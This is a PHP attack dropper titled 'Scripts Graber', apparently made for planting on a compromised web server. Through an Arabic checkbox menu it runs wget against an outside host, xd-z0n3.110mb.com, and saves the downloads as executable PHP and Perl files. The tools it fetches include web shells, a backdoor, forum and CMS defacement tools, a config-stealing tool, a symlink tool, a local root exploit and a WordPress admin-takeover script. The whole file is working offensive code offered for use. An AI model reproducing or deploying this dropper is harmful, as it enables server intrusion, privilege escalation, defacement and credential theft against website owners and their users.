<?
set_time_limit(0);
//variables
$go = $_POST['go'];
$go2 = $_POST['go2'];
$SQL = $_POST['SQL'];
$ssh = $_POST['ssh'];
$arab_m = $_POST['arab_m'];
$m0g = $_POST['m0g'];
$rootshell = $_POST['rootshell'];
$luCaR = $_POST['luCaR'];
$joomla = $_POST['joomla'];
$mybb = $_POST['mybb'];
$config_scare = $_POST['config_scare'];
$cg1 = $_POST['cg1'];
$wordpress = $_POST['wordpress'];
$sym = $_POST['sym'];
$l2008 = $_POST['l2008'];
$l404 = $_POST['l404'];
$backdoor = $_POST['backdoor'];
$z0n3_H = $_POST['z0n3_H'];
$izocin = $_POST['izocin'];
$saf4 = $_POST['saf4'];
$WEBADMIN = $_POST['WEBADMIN'];
$vb_k1ll = $_POST['vb_k1ll'];
$L1nux = $_POST['L1nux'];
$root = $_POST['root'];
$xDeZenDeR = $_POST['xDeZenDeR'];
$xbyp4ss = $_POST['xbyp4ss'];
$l5ql = $_POST['l5ql'];
$xshell = $_POST['xshell'];



echo "<html dir=rtl><head><title>Scripts Graber</title><meta http-equiv='Content-Type' content='text/html; charset=windows-1256'>
<meta http-equiv='Content-Language' content='ar-ae'><style>body{background: black;color:#33FF00}.sub{background:black;border:1px dashed green;color:yellow}</style></head>
<body><table width=50% align=center style='border:1px green solid'><tr><td align=center><b><font face='Courier New' size=4 color=yellow>Scripts Graber</font></b></td></tr></table>
";
if($go2)
{
if($SQL){system("wget http://xd-z0n3.110mb.com/SQL.txt;mv SQL.txt SQL.php");}
if($ssh){system("wget http://xd-z0n3.110mb.com/ssh.txt;mv ssh.txt ssh.php");}
if($arab_m){system("wget http://xd-z0n3.110mb.com/arabic-m.txt;mv arabic-m.txt arabic-m.php");}
if($m0g){system("wget http://xd-z0n3.110mb.com/m0g.txt;mv m0g.txt m0g.php");}
if($rootshell){system("wget http://xd-z0n3.110mb.com/rootshell.txt;mv rootshell.txt rootshell.php");}
if($luCaR){system("wget http://xd-z0n3.110mb.com/luCaR.txt;mv luCaR.txt luCar.php");}
if($joomla){system("wget http://xd-z0n3.110mb.com/joomla.txt;mv joomla.txt joomla.php");}
if($mybb){system("wget http://xd-z0n3.110mb.com/mybb.txt;mv mybb.txt mybb.php");}
if($config_scare){system("wget http://xd-z0n3.110mb.com/config-scare.txt;mv config-scare.txt config-scare.php");}
if($cg1){system("wget http://xd-z0n3.110mb.com/cg1.txt;mv cg1.txt cg1.pl");chmod("cg1.pl",0755);}
if($wordpress){system("wget http://xd-z0n3.110mb.com/wordpress.txt;mv wordpress.txt wordpress.php");}
if($sym){system("wget http://xd-z0n3.110mb.com/sym.txt;mv sym.txt sym.pl");chmod("sym.pl",0755);}
if($l2008){system("wget http://xd-z0n3.110mb.com/l2008.txt;mv l2008.txt l2008.php");}
if($l404){system("wget http://xd-z0n3.110mb.com/l404.txt;mv l404.txt l404.php");}
if($backdoor){system("wget http://xd-z0n3.110mb.com/backdoor.txt;mv backdoor.txt backdoor.pl");chmod("backdoor.pl",0755);}
if($z0n3_H){system("wget http://xd-z0n3.110mb.com/z0n3-H.txt;mv z0n3-H.txt z0n3-H.php");}
if($izocin){system("wget http://xd-z0n3.110mb.com/izocin.txt;mv izocin.txt izocin.php");}
if($saf4){system("wget http://xd-z0n3.110mb.com/saf4.txt;mv saf4.txt saf4.php");}
if($WEBADMIN){system("wget http://xd-z0n3.110mb.com/WEBADMIN.txt;mv WEBADMIN.txt WEBADMIN.php");}
if($vb_k1ll){system("wget http://xd-z0n3.110mb.com/vb-k1ll.txt;mv vb-k1ll.txt vb-k1ll.php");}
if($L1nux){system("wget http://xd-z0n3.110mb.com/L1nux.htm");}
if($root){system("wget http://xd-z0n3.110mb.com/root.txt;mv root.txt root.pl");chmod("root.pl",0755);}
if($xDeZenDeR){system("wget http://xd-z0n3.110mb.com/xDeZenDeR.txt;mv xDeZenDeR.txt xDeZenDeR.php");}
if($xbyp4ss){system("wget http://xd-z0n3.110mb.com/xbyp4ss.txt;mv xbyp4ss.txt xbyp4ss.php");}
if($l5ql){system("wget http://xd-z0n3.110mb.com/l5ql.txt;mv l5ql.txt l5ql.php");}
if($xshell){system("wget http://xd-z0n3.110mb.com/xshell.txt;mv xshell.txt xshell.php");}
echo "تم سحب الملفات المختاره على المسار التالي:";
echo "<br>".getcwd();
}

function footer()
{
    echo "<table width=50% align=center style='border:1px green solid'><tr><td align=center><font face=Tahoma size=2 color=yellow>Script Coded By Crazy_Hacker + GoLdeN-z3r0 </font></td></tr></table>";
}
if($go){echo "<br><table width=50% align=center style='border:1px green solid'><tr><td align=center><br><form method=POST action=''><tr><td>اداة مثل النت كات</td><td><input type=checkbox name=ssh>
</td></tr><tr><td>الاتصال بقواعد البيانات</td><td><input type=checkbox name=SQL></td></tr>
<tr><td>ماس للعرب ميرور</td><td><input type=checkbox name='arab_m'></td></tr>
<tr><td>سكربت المجرم لتغير اندكس المنتدى</td><td><input type=checkbox name=m0g></td></tr>
<tr><td>شيل رووت شيل لتخطي الحماية رائع</td><td><input type=checkbox name=rootshell></td></tr>
<tr><td>شيل رائع من مزايا مثل السنايبر</td><td><input type=checkbox name=luCaR></td></tr>
<tr><td>اداة لتغير اندكس سكربت جوملا</td><td><input type=checkbox name=joomla></td></tr>
<tr><td>اداة لتغير اندكس منتدى myBB</td><td><input type=checkbox name=mybb></td></tr>
<tr><td>اداة لسحب الكونفيق رائعه جداً</td><td><input type=checkbox name='config_scare'></td></tr>
<tr><td>اداة السي جي آي تلنت</td><td><input type=checkbox name=cg1></td></tr>
<tr><td>اداة لتغير معلومات ادمن للورد بريس</td><td><input type=checkbox name=wordpress></td></tr>
<tr><td>اداة السيم لينك بالبيرل</td><td><input type=checkbox name=sym></td></tr>
<tr><td>شيل رائع من فريق انجل سكيورتي تيم</td><td><input type=checkbox name=l2008></td></tr>
<tr><td>من افضل الشيلات لتنفيذ الاومر</td><td><input type=checkbox name=l404></td></tr>
<tr><td>باك دور</td><td><input type=checkbox name=backdoor></td></tr>
<tr><td>ماس الزون</td><td><input type=checkbox name='z0n3_H'></td></tr>
<tr><td>افضل اداة لحد الان + برايفت</td><td><input type=checkbox name=izocin></td></tr>
<tr><td>اداة الغضب لتخطي</td><td><input type=checkbox name=saf4></td></tr>
<tr><td>شيل الويب ادمن لحقن قوالب الـFAQ</td><td><input type=checkbox name=WEBADMIN></td></tr>
<tr><td>اداة الحقن في القوالب faq</td><td><input type=checkbox name='vb_k1ll'></td></tr>
<tr><td>اغلب اوامر اللينكس اللى تهم المخترق</td><td><input type=checkbox name=L1nux></td></tr>
<tr><td>لوكل لاخذ رووت على جميع الاصدارات</td><td><input type=checkbox name=root></td></tr>
<tr><td>اداة سحب + قراءة + فك تشفيرة الزند و الـIon_Cube لكونفيق منتدى vbulletin</td><td><input type=checkbox name=xDeZenDeR></td></tr>
<tr><td>سكريبت تخطي اصدار 5</td><td><input type=checkbox name=xbyp4ss></td></tr>
<tr><td>سكريبت اتصال يقاعدة البينات قوي جدا</td><td><input type=checkbox name=l5ql></td></tr>
<tr><td>شل من برمجة عربية قوي جدا</td><td><input type=checkbox name=xshell></td></tr>
<tr><td align=center><input type=submit name=go2 class=sub value='Grab Selected'><br></tr></td>
</form></td></tr></table>
</body>";footer();die();}

echo "<br><table width=50% align=center style='border:1px green solid'><tr><td align=center><br><form method=POST action=''><input class=sub type=submit name=go value='Choose Scripts'></form></td></tr></table>
</body>";footer();



?>